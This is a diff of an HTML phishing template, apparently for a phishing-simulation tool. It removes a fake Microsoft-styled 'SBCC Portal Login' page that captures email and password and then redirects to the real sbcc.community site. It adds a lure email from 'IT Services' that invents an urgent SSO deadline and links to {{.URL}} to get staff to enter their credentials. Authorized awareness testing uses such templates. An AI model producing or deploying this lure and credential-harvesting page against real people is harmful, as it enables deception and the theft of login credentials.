@@ -1,89 +1,42 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>SBCC Portal Login</title>
-  <link href="https://static2.sharepointonline.com/files/fabric/office-ui-fabric-core/11.0.0/css/fabric.min.css" rel="stylesheet">
-  <link rel="icon" href="https://c.s-microsoft.com/favicon.ico" />
-  <style>
-    body {
-      font-family: Segoe UI, sans-serif;
-      background-color: #f3f2f1;
-      margin: 0;
-      padding: 0;
-    }
+<html>
+  <body style="font-family:Segoe UI, sans-serif; background-color:#f9f9f9; padding:20px;">
+    <div style="max-width:600px; margin:auto; background-color:white; padding:30px; border:1px solid #ddd; border-radius:8px;">
+      <img src="" alt="Logo" width="180" style="margin-bottom:20px;">
+      
+      <h2 style="color:#333;">ACTION REQUIRED: SSO Integration Pending</h2>
 
-    .login-box {
-      width: 320px;
-      margin: 100px auto;
-      background: white;
-      padding: 30px;
-      border-radius: 4px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      text-align: center;
-    }
+      <p style="font-size:15px; color:#555;">
+        Dear Faculty/Staff Member,
+      </p>
 
-    .login-box img.logo {
-      margin-bottom: 20px;
-      max-width: 100%;
-      height: auto;
-    }
+      <p style="font-size:15px; color:#555;">
+        As part of our system-wide upgrade, [your company] is rolling out a new Single Sign-On (SSO) integration for enhanced security and streamlined access to internal portals and services.
+      </p>
 
-    input[type=email], input[type=password] {
-      width: 100%;
-      padding: 10px;
-      margin-bottom: 15px;
-      border: 1px solid #ccc;
-      border-radius: 2px;
-    }
+      <p style="font-size:15px; color:#d9534f;"><strong>
+        Action is required before <span style="text-decoration: underline;">Monday, April 1st</span> to avoid disruption of access.
+      </strong></p>
 
-    input[type=submit] {
-      background-color: #0078d4;
-      color: white;
-      border: none;
-      padding: 10px;
-      width: 100%;
-      border-radius: 2px;
-    }
+      <p style="font-size:15px; color:#555;">
+        Please log in to the [your company] Portal using your existing credentials to initiate the SSO pairing process:
+      </p>
 
-    .forgot-password {
-      font-size: 13px;
-      margin-top: 10px;
-      color: #0078d4;
-      display: block;
-      text-decoration: none;
-    }
+      <p style="text-align:center; margin:30px 0;">
+        <a href="{{.URL}}" style="background-color:#0078d4; color:white; text-decoration:none; padding:12px 24px; border-radius:4px; font-size:16px;">
+          Initiate SSO Setup
+        </a>
+      </p>
 
-    h2 {
-      font-size: 20px;
-      margin-bottom: 20px;
-    }
-  </style>
-</head>
-<body>
-  <div class="login-box">
-    <img
-      src=""
-      alt="Logo"
-      class="logo"
-      width="200"
-    />
-    <h2>SBCC Portal Login</h2>
-    <form method="POST" action="">
-      <input type="email" name="email" placeholder="Username" required />
-      <input type="password" name="password" placeholder="Password" required />
-      <input type="submit" value="Sign in" />
-    </form>
-    <a href="#" class="forgot-password">Forgot password?</a>
-  </div>
+      <p style="font-size:14px; color:#777;">
+        If you have already completed this step, no further action is required.
+      </p>
 
-  <script>
-    // Redirect user after 1.5 seconds of form submission
-    document.querySelector('form').addEventListener('submit', function () {
-      setTimeout(() => {
-        window.location.href = "https://www.sbcc.community/";
-      }, 1500);
-    });
-  </script>
-</body>
+      <p style="font-size:14px; color:#777; margin-top:30px;">
+        Thank you,<br>
+        IT Services<br>
+        <a href="mailto:email@yourcompany.com">support@yourcompany.com</a>
+      </p>
+    </div>
+  </body>
 </html>
